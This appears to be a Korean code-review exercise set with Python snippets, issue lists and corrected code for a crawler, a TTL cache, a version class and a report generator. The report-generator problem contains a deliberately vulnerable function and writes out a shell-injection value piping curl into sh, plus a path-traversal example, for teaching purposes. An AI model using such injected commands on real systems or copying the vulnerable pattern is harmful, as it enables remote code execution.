Expert 문제 9 — 비동기 크롤러

import asyncio, aiohttp, requests results = {} async def fetch(session, url): async with session.get(url) as resp: results[url] = await resp.text() async def crawl(urls): async with aiohttp.ClientSession() as session: for url in urls: asyncio.create_task(fetch(session, url)) await asyncio.sleep(5) # wait for tasks to finish robots = requests.get(urls[0] + "/robots.txt").text return results, robots
찾아야 할 이슈
  • [Blocking] L12-13 태스크를 기다리지 않고 sleep(5)로 "추측" → 5초 넘는 요청은 세션이 닫힌 뒤 실패(L10 컨텍스트 종료), 빠르면 시간 낭비. 태스크 참조를 버려 GC로 사라질 수 있고 예외도 유실.
  • [Blocking] L14 async 함수 안의 동기 requests.get → 이벤트 루프 전체 블로킹. timeout도 없음. urls가 비면 IndexError.
  • [Blocking] L3 모듈 전역 results → 호출 간 결과 누적, 동시 crawl 호출 시 섞임. 반환값으로 수집.
  • [Blocking] 동시성 제한 없음 → URL 1만 개면 소켓/파일 디스크립터 고갈, 대상 서버에 DoS.
  • [Suggestion] L6 요청별 timeout, 상태 코드 검사(raise_for_status), 응답 크기 제한 없음.
  • [Suggestion] 실패한 URL을 결과에 어떻게 표현할지(부분 실패 허용?) 설계 필요. TaskGroup은 하나 실패 시 전체 취소이므로 요구사항에 맞게 선택.
개선 코드
import asyncio import aiohttp async def fetch(session: aiohttp.ClientSession, sem: asyncio.Semaphore, url: str) -> str: async with sem: async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp: resp.raise_for_status() return await resp.text() async def crawl(urls: list[str], concurrency: int = 20 ) -> dict[str, str | BaseException]: sem = asyncio.Semaphore(concurrency) async with aiohttp.ClientSession() as session: # 부분 실패 허용: 예외를 결과로 받아 URL 별로 기록 outcomes = await asyncio.gather( *(fetch(session, sem, u) for u in urls), return_exceptions=True) return dict(zip(urls, outcomes, strict=True)) # robots.txt 도 같은 세션으로 await fetch(...) 하여 가져온다

Python 3.11+에서 "하나라도 실패하면 전부 취소"가 맞다면 asyncio.TaskGroup이 더 안전합니다.

Expert 문제 10 — TTL 메모이제이션 데코레이터

import time _cache = {} def memoize(ttl): def deco(fn): def wrapper(*args, **kwargs): key = (fn.__name__, args, str(kwargs)) if key in _cache: value, ts = _cache[key] if time.time() - ts < ttl: return value value = fn(*args, **kwargs) _cache[key] = (value, time.time()) return value return wrapper return deco
찾아야 할 이슈
  • [Blocking] L8 키에 fn.__name__ → 다른 모듈의 같은 이름 함수(get, load)끼리, 또는 다른 클래스의 같은 이름 메서드끼리 캐시 충돌하여 엉뚱한 값 반환. 함수별 캐시(클로저 안 dict) 사용.
  • [Blocking] L8 str(kwargs)는 키워드 순서에 따라 다른 키 (f(a=1, b=2) vs f(b=2, a=1)), repr이 같은 서로 다른 객체가 충돌. 리스트 같은 unhashable 위치 인자는 TypeError.
  • [Blocking] 만료 항목을 지우지 않고 크기 상한도 없음 → 무한 메모리 증가 (장기 실행 서비스에서 누수).
  • [Blocking] async 함수에 적용하면 코루틴 객체를 캐시 → 두 번째 호출자가 이미 await된 코루틴을 받아 RuntimeError: cannot reuse already awaited coroutine.
  • [Suggestion] 스레드 안전성: check-then-act 사이에 여러 스레드가 동시에 미스 → 같은 비싼 계산을 중복 수행(cache stampede). 키별 락 또는 single-flight.
  • [Suggestion] L11,14 time.time()은 시스템 시계 변경에 영향 → time.monotonic().
  • [Suggestion] L7 functools.wraps 누락 → 이름·docstring·시그니처 유실. 캐시 무효화 API(cache_clear)도 없음.
  • [Question] 가변 객체 반환 시 공유 문제, 예외는 캐시하지 않는 동작이 의도인지 문서화.
개선 코드
import functools, inspect, threading, time from collections import OrderedDict from collections.abc import Callable def ttl_cache[**P, R](ttl_s: float, maxsize: int = 1024): def deco(fn: Callable[P, R]) -> Callable[P, R]: if inspect.iscoroutinefunction(fn): raise TypeError("use an async-aware cache for coroutine functions") cache: OrderedDict[object, tuple[R, float]] = OrderedDict() lock = threading.Lock() @functools.wraps(fn) def wrapper(*args: P.args, **kwargs: P.kwargs) -> R: key = functools._make_key(args, kwargs, typed=False) # lru_cache 와 동일 규칙 now = time.monotonic() with lock: hit = cache.get(key) if hit is not None and now - hit[1] < ttl_s: cache.move_to_end(key) return hit[0] value = fn(*args, **kwargs) # 락 밖에서 계산 with lock: cache[key] = (value, time.monotonic()) cache.move_to_end(key) while len(cache) > maxsize: cache.popitem(last=False) # LRU 축출 return value wrapper.cache_clear = cache.clear # type: ignore[attr-defined] return wrapper return deco

functools._make_key는 비공개 API이므로 실제로는 (args, frozenset(kwargs.items()))를 쓰거나 검증된 라이브러리(cachetools.TTLCache)를 권장하는 것이 리뷰의 정답에 더 가깝습니다. 중복 계산(stampede) 방지가 필요하면 키별 락을 추가.

Expert 문제 11 — 버전 객체

class Version: def __init__(self, s): self.parts = [int(p) for p in s.split('.')] def __eq__(self, other): return self.parts == other.parts def __lt__(self, other): return self.parts < other.parts def __hash__(self): return hash(str(self.parts)) def bump(self): self.parts[-1] += 1 seen = set() v = Version("1.2.3") seen.add(v) v.bump() print(v in seen)
찾아야 할 이슈
  • [Blocking] L11-15, L19-21 가변 객체가 hashable: bump() 후 해시가 바뀌어 set/dict에서 찾을 수 없음 → print는 False. 해시를 정의할 거면 불변으로 (tuple + frozen), bump는 새 객체 반환.
  • [Blocking] L6 다른 타입과 비교 시 AttributeError (Version("1") == "1", v in [None]). NotImplemented 반환해야 함.
  • [Suggestion] "1.2"와 "1.2.0"이 다르다고 판정 — 의도인가? 정규화(후행 0 제거) 필요.
  • [Suggestion] __lt__만 있어 <=, >=는 TypeError → @total_ordering 또는 dataclass order=True.
  • [Suggestion] L3 "1.a", " 1.2", "1.2.3-rc1" 입력 시 불친절한 ValueError → 명확한 에러 메시지, 사전 릴리스 규칙 정의.
  • [Suggestion] __repr__ 없음. 그리고 PEP 440 버전이라면 packaging.version.Version 재사용이 정답일 수 있음 (바퀴 재발명).
  • [Nit] L12 hash(str(...)) → hash(tuple(...)).
개선 코드
from dataclasses import dataclass import re _VERSION_RE = re.compile(r"\d+(\.\d+)*") @dataclass(frozen=True, order=True, slots=True) class Version: parts: tuple[int, ...] @classmethod def parse(cls, s: str) -> "Version": if not _VERSION_RE.fullmatch(s): raise ValueError(f"invalid version string: {s!r}") parts = tuple(int(p) for p in s.split(".")) while len(parts) > 1 and parts[-1] == 0: # 1.2.0 == 1.2 parts = parts[:-1] return cls(parts) def bump(self) -> "Version": return Version(self.parts[:-1] + (self.parts[-1] + 1,)) def __str__(self) -> str: return ".".join(map(str, self.parts))

Expert 문제 12 — 리포트 생성과 캐시 (보안)

import subprocess, pickle, os def run_report(user_input, cache_dir="/tmp/cache"): cache_file = os.path.join(cache_dir, user_input + ".pkl") if os.path.exists(cache_file): return pickle.load(open(cache_file, "rb")) out = subprocess.check_output( f"report-gen --name {user_input}", shell=True) data = parse(out) pickle.dump(data, open(cache_file, "wb")) return data
찾아야 할 이슈
  • [Blocking·보안] L7-8 셸 인젝션: name=x; curl evil.sh | sh → 원격 코드 실행. 인자 리스트 + shell=False, 입력 화이트리스트 검증.
  • [Blocking·보안] L4 경로 순회: ../../home/app/.ssh/x → 임의 위치에 파일 쓰기/읽기.
  • [Blocking·보안] L3, L6 누구나 쓸 수 있는 /tmp의 pickle 로드 → 같은 호스트의 다른 사용자가 악성 pickle을 심으면 RCE. JSON 등 안전한 포맷 + 앱 전용 디렉터리(권한 0700).
  • [Blocking] L6, L10 파일 핸들 미종료. L10은 원자적 쓰기 아님 → 동시 요청이 쓰다 만 파일을 읽어 깨진 데이터/예외. 임시 파일에 쓰고 os.replace.
  • [Suggestion] L5 exists 후 open (TOCTOU) → try/except FileNotFoundError. 캐시 무효화(만료) 정책 없음.
  • [Suggestion] L7 timeout 없음 → 외부 프로세스가 멈추면 요청 스레드 고갈. 실패 시 stderr를 로그로.
  • [Suggestion] cache_dir 미존재 시 실패 → mkdir(parents=True, exist_ok=True).
개선 코드
import json, os, re, subprocess, tempfile from pathlib import Path NAME_RE = re.compile(r"[A-Za-z0-9_-]{1,64}") CACHE_DIR = Path(os.environ.get("REPORT_CACHE_DIR", "/var/cache/myapp/reports")) def run_report(name: str) -> dict: if not NAME_RE.fullmatch(name): raise ValueError("invalid report name") CACHE_DIR.mkdir(mode=0o700, parents=True, exist_ok=True) cache_file = CACHE_DIR / f"{name}.json" try: return json.loads(cache_file.read_text(encoding="utf-8")) except FileNotFoundError: pass proc = subprocess.run( ["report-gen", "--name", name], capture_output=True, check=True, timeout=60, ) data = parse(proc.stdout) # 원자적 쓰기: 같은 디렉터리에 임시 파일 → os.replace with tempfile.NamedTemporaryFile("w", dir=CACHE_DIR, delete=False, encoding="utf-8", suffix=".tmp") as tmp: json.dump(data, tmp) os.replace(tmp.name, cache_file) return data

모범 답안 예시: 리뷰 코멘트를 실제 문장으로

문제 7(계좌 이체)에 대해 인터뷰에서 말하거나 PR에 남길 수 있는 코멘트 예시입니다.

[Blocking] 원자성 L8에서 출금 계좌를 저장한 뒤 L10 저장이 실패하면(네트워크 오류, 제약 위반 등) 출금만 반영되고 입금은 누락되어 금액이 사라집니다. 두 저장과 이체 기록을 하나의 DB 트랜잭션으로 묶고, 예외 시 롤백되도록 with db.transaction(): 블록을 제안합니다.
[Blocking] 동시성 잔액 확인(L5)과 차감(L7) 사이에 같은 계좌의 다른 이체가 끼어들 수 있어 잔액 이상으로 출금될 수 있습니다. 행 잠금(SELECT ... FOR UPDATE)이나 조건부 UPDATE로 확인과 차감을 원자적으로 만들어야 합니다. 두 계좌를 잠글 때는 ID 순서로 잠가 데드락을 피하는 게 좋겠습니다.
[Blocking] 입력 검증 amount가 음수면 반대 방향 이체가 됩니다. 0 이하 금액과 같은 계좌 간 이체를 거부해 주세요. 금액 타입은 float이 아닌 Decimal이면 좋겠습니다.
[Suggestion] 에러 처리 지금은 잔액 부족과 DB 장애, 코드 버그가 모두 False로 뭉개져서 호출자도 운영자도 원인을 알 수 없습니다. InsufficientFundsError 같은 도메인 예외를 정의해 호출자가 처리하게 하고, 예기치 못한 예외는 전파되도록 두면 어떨까요? 로그는 print 대신 log.exception을 부탁드립니다.
[Praise] 잔액 부족을 이체 전에 검사하는 흐름 자체는 명확합니다. 위 사항을 반영하면 테스트로 동시 이체 시나리오(스레드 2개로 같은 계좌 출금)도 추가하면 좋겠습니다.
